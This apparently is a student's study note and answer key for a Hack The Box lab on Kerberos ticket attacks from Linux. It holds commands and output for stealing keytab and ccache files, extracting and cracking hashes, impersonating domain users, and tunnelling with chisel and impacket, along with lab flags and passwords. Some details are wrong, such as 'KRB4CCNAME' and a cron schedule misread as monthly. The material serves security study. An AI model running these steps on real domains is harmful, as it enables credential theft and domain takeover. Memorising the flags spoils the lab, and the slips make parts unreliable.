
## Kerberos on Linux

> [!Hint] KRB5CCNAME
> - Linux machines store Kerberos tickets as coaches files in /tmp
> - Kerberos ticket default location is the env var `KRB5CCNAME`. It can ID if `K` tickets are being used or if the default location has changed
> - Keytab file contains a pair of `K` principals and encrypted keys
> - Keytabs allow you to authenticate to remote systems without a password

^a748ee

## Identifying Linux and Active Directory Integration

The `realm` tool manages system enrollment in a domain
```go
realm list
```

`sssd` and `winbind` can also be used to integrate Linux with AD
```go
ps -ef | grep -i "winbind\|sssd"
```

Determining AD integration via the nsswitch.conf file
```go
cat /etc/nsswitch.conf | grep -i "sss\|winbind\|ldap"
```

via the `id` command
```go
id dan
```

How to check whether the Linux server is integrated with AD using system-auth file
```go
cat /etc/pam.d/system-auth  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so
```

```go
cat /etc/pam.d/system-auth-ac  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so
```

# Finding Kerberos tickets in Linux

>[! Note] The following sections explores common ways to find Kerberos tickets

### Finding KeyTab Files
```go
find / -name *keytab* -ls 2>/dev/null
```

### Finding KeyTab files in Cronjobs
```go
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
...SNIP...
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

>[!Hint] Hint
> The hint that Kerberos is in use is the `kinit` command. Kinit requests the users TGT and stores the ticket in the cache(ccache file). Kinit can be used to import a keytab into a session and masquerade as the user

The below line indicates importing a Kerberos ticket for the user `svc_workstations@INLANEFREIGHT.HTB`  before connecting via smbclient
```go
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
```

##### Linux KeyTab File
>[!hint] ##### Linux KeyTab File
> A Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

## Finding ccache files

>[!info] Ccach Files aka Cache
> - Holds credentials during the users sessions, generally
> - Located at `/tmp` by default
> - Created after a user authenticates to a domain. The ccache file stores ticket information
> - Path to file is stored inside the `KRB4CCNAME` environment variable

```go
env | grep -i krb5
```

## Abusing KeyTab files

>[! iNFO] To use a keytab file, we need to know which user it was created for:
> - Your first goal would be to impersonate a user with #kinit 
> - [klist]() can be used to interact with Kerberos on Linux. It reads information from a keytab file

#### Listing KeyTab file information
```go
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

#### Impersonating a user with a KeyTab
```go
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
```

```go
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```

#### With Carlos's accesses, Connect to SMB Share as Carlos
```go
smbclinet //dc01/carlos -k -c ls
```

# KeyTab Extract

>[!info] 
> Cracking the accounts passwords by extracting the hashes from a keytab file is also possible via [KeyTabExtractor](https://github.com/sosdave/KeyTabExtract). It will extract info such as the realm, Service Principal, Encryption Type and Hashes

## Extracting KeyTab hashes with KeyTabExtract
```go
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

#Rubeus can be used to forge our own tickets with the hashes displayed. Or they can be cracked via #hashcat or #JohnTheRipper . Or via [crackstation.net](https://crackstation.net)

## Abusing KeyTab ccache

>[!Info] Pre-requisites
> The only requirement we need is read privileges on the ccache file

>[!tip] Info 
> From here on we're assuming the user `Julio` is a member of the `Domain Admins` group, after we do some local user enumeration e.g., `id julio@inlanefreight.htb'

To use a ccache file, copy it and assign the file path to the #KRB4CCNAME variable

```go
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Wed Oct  5 13:20:00 2022

               7706623 blocks of size 4096. 4447612 blocks available
```


# Linux Attack tools with Kerberos

[[Pass the Ticket from Linux#^a748ee|KRB5CCNAME]]
> [!NOTE] 
> To use Linux attack tools to interact with a Windows domain joined machine:
> - If from a Windows domain joined machine....ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use
> - If from a non Windows domain joined machine, (the attacker)...make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working

In this scenario, you will be attacking Active Directory by utilizing MS01, proxying your traffic through that machine. This is because your attacker machine does not have a connection to the KDC/Domain Controller, so you can't use it for name resolution 

Step 1: Download and start Chisel
```go
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```

```go
sudo ./chisel server --reverse
```

Step 2: RDP to MS01 and execute chisel
```go
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

```go
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

	NOTE: Client IP, 10.10.14.33, is your attack machine

Step3: Transfer Julio's #ccache file from LINUX01 and create the environment variable [[Pass the Ticket from Linux#^a748ee|KRB5CCNAME]] with the value corresponding to the path of the ccache file
```go
datboyblu3@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

## Impacket

> [!NOTE] Impacket with Proxychains and Kerberos Authentication
> Specify target machine name and use the `-k` option. Use -no-pass for no password
```go
proxychains impacket-wmiexec dc01 -k -no-pass
```

Output of the above command:
```go
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio
```

## Evil-WinRM

> [!tip] Evil-WinRM with Kerberos
> To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication.
```go
sudo apt-get install krb5-user -y
```

Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`


# Linikatz

> [!NOTE] This tool exploits Linux credentials when the machine is integrated with Active Directory.
> You must be root on the machine. It will extract all credentials, including Kerberos tickets and place them in a folder that starts with **linikatz**

Download it here [Linikatz](https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh)



-------------

# Questions

IP
```go
10.129.204.23
```

Username
```go
david@inlanefreight.htb
```

Password
```go
Password2
```

SSH
```go
ssh -p 2222 david@inlanefreight.htb@10.129.204.23
```


##### Question 2: 
Which group can connect to LINUX01?
```go
realm list
```

##### Question 3: 
Look for a keytab file that you have read and write access. Submit the file name as a response. [[Pass the Ticket from Linux#Finding KeyTab Files|Finding KeyTab Files]] 
```go
find / -name *keytab* -ls 2>/dev/null
```

##### Question 4:
Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.
```go
C@rl0s_1$_H3r3
```

Extracting the hashes via [[Pass the Ticket from Linux#KeyTab Extract|KeyTab Extract]] 
```go
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

```go
 REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Crack the hash with hashcat. Reference: [[Attacking Active Directory & NTDS.dit#Cracking Hashes|Cracking NTLM Hashes]]  
*Remember to run the command again with the --show flag*
```go
hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt 
```

Password
```go
Password5
```

Logging in with credentials and find the flag in carlos's home directory
```go
su carlos@inlanefreight.htb
```

##### Question 5:
Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.
```go
Mor3_4cce$$_m0r3_Pr1v$
```

Finding KeyTab Files in Cronjob [[Pass the Ticket from Linux#Finding KeyTab files in Cronjobs | KeyTab Cronjobs]]  

View cronjobs
```go
crontab -l
```

Output shows a script called `kerberos_script_test.sh` being executed every month
```go
# m h  dom mon dow   command
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

The output of the `kerberos_script_test.sh` file  shows Carlos has access to a keytab file called `svc_workstations.kt` for the svc_workstations user.

Extract the hash for the svc_workstations user
```go
python3 /opt/keytabextract.py ~/.scripts/svc_workstations.kt
```

Output shows there's no available NTLM hash
```go
[!] No RC4-HMAC located. Unable to extract NTLM hashes.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
```

There's another keytab file called ``

Extracting that hash:
```go
python3 /opt/keytabextract.py ~/.scripts/svc_workstations._all.kt
```

Output:
```go
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
        AES-128 HASH : 3a7e52143531408f39101187acc80677

```

Cracking the NTLM hash
```go
hashcat -m 1000 7247e8d4387e76996ff3f18a34316fdd /usr/share/wordlists/rockyou.txt 
```

Password
```go
Password4
```

Log in with svc_workstations 
```go
ssh -p 2222 svc_workstations@inlanefreight.htb@10.129.204.23
```
##### Question 6:
Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.

```go
Ro0t_Pwn_K3yT4b
```

##### Question 7:
Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.



Checking /tmp and Julio's Kerberos ticket/ccache file is listed amongst others:
```go
krb5cc_647401106_HRJDux
```

- Copy the ccache file to the current directory
- Export the ticket to the KRB5CCNAME variable
- Run klist to display the ticket info and verify the import/export was successful

> [!WARNING] ENSURE THE "VALID STARTING" AND "EXPIRES" field are current!!!

```go
root@linux01:~# cp /tmp/krb5cc_647401106_4e6lOt .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_4e6lOt
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_4e6lOt
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
12/16/2025 22:20:02  12/17/2025 08:20:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 12/17/2025 22:20:02
root@linux01:~# 
root@linux01:~# smbclient //dc01/julio -k -c ls
  .                                   D        0  Thu Jul 14 12:25:24 2022
  ..                                  D        0  Thu Jul 14 12:25:24 2022
  julio.txt                           A       17  Thu Jul 14 21:18:12 2022

                7706623 blocks of size 4096. 4435590 blocks available
root@linux01:~# 
```

```go
smbclient //dc01/julio -k -c 'get julio.txt'
```

Flag
```go
JuL1()_SH@re_fl@g
```

##### Question 8
Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_)

Download and execute [[Pass the Ticket from Linux#Linikatz|Linikatz]] 
```go
https://github.com/CiscoCXSecurity/linikatz/blob/master/linikatz.sh
```


> [!hint] Remember the default location for KeyTab files is `/etc/krb5.keytab`! After executing `Linikatz` check that dir again for the new KeyTab


For KeyTab reference: [[Pass the Ticket from Linux#Linux KeyTab File |Linux KeyTab File]] and [[Pass the Ticket from Linux#Impersonating a user with a KeyTab|Impersonate User with KeyTab]]  

Use Kinit to impersonate the user `LINUX01`
```go
kinit LINUX01$ -k -t /etc/krb5.keytab
```

Access SMB Share
```go
smbclient //dc01/linux01 -k -c 'get flag.txt'
```

Flag
```go
Us1nG_KeyTab_Like_@_PRO
```


##### Question 9
Transfer Julio's ccache file from LINUX01 to your attack host. Follow the example to use chisel and proxychains to connect via evil-winrm from your attack host to MS01 and DC01. Mark DONE when finished.


> [!hint] Your Attacker Machine is Not a Member of the Domain
> Because of this, I need to proxy my traffic via MS01 with Chisel or Proxychains and edit hte /etc/hosts file to input IPs of the target domain and machines.

Add the socks5 line to /etc/proxychains4.conf
```go
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
socks5  127.0.0.1 1080
```

Add the following to the end of /etc/hosts
```go
172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

Execute chisel
```go
sudo ./chisel server --reverse
```

